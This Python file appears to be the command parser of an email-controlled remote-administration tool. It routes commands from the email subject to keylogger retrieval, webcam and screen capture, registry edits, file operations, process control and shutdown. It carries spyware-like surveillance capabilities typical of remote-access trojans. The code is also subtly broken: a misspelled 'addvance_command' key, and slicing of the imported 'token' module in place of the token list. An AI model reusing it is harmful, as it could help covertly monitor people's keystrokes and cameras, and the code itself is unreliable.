import shlex
import token
import constants
import utils

from services import app, help, keylogger, mac, pc, process, registry, screen, webcam


request_tree = {
    'basic_command' : {
        'mac' : {
            'get': [0, mac.get_mac]
        },
        'app' : {
            'get': [0, app.get_apps], 
            'close': [1, None]
        },
        'process': {
            'get': [0, process.get_processes],
            'close': [1, None]
        }, 
        'keylogger': {
            'get': [1, keylogger.get_key_log]
        },
        'screen': {
            'get' : {
                'image': 0,
                'video': 1
            },
        }, 
        'webcam': {
            'get' : {
                'image': 0,
                'video': 1
            }
        },
        'help': 0
    },
    'addvance_command' : {
        'pc' : {
            'shutdown': [0, pc.shutdown],
            'restart': [0, pc.restart]
        },
        'registry': {
            'get': [3, registry.get],
            'add': [3, registry.new_key],
            'modify': [5, registry.modify_key],
            'remove': [3, registry.drop_key],
        },
        'file': {
            'tree': 1,
            'copy': 2,
            'cut': 2,
            'delete': 1
        }
    }
}

# white list include basic user and advance user
__white_list = utils.load_config('./configs/white_list.yaml')['allowed']

def parse_request(mail_content):
    sender, header = mail_content['sender'], mail_content['subject'] 
    tokens = shlex.split(header)
    
    if (tokens[0] != constants.APP_REQ):
        return {
            'msg': 'Wrong request format'
        }
    
    tokens = tokens[1: ]
    
    if len(tokens) == 0:
        return {
            'msg': 'Command not found'
        }
    
    tree = None
    
    if tokens[0].lower() in request_tree['basic_command']:
        tree = request_tree['basic_command']
    elif tokens[0].lower() in request_tree['advance_command']:
        if sender not in __white_list['advance_user']:
            return {
                'msg': 'Permision denied'
            }
        tree = request_tree['advance_command']

    if not tree:
        return {
            'msg': 'Command not found'
        }
    
    token = token[1 : ]
    
    len_expected = 0
    func, param = None, None
    
    for iter, node in enumerate(tokens, 0):
        if not type(tree) == dict:
            if iter + tree[0] >= len(tokens):
                return {
                    'msg': f'{" ".join(tokens[ : iter])} take at least {tree[0]} parameter(s). Found {len(tokens) - 1 - iter}'
                }
            
            func = tree[1]
            
            if tree[0] != 0:
                param = token[iter: iter + tree[0]]
            
            break
        
        if node.lower() in tree:
            len_expected += 1
            tree = tree[node.lower()]
        else:
            return {
                'msg' : f'Command not found {" ".join(tokens[ : iter])}'
            }
        
    return {
        'function': func,
        'params': param,
        'msg': 'Parse request successfully'
    }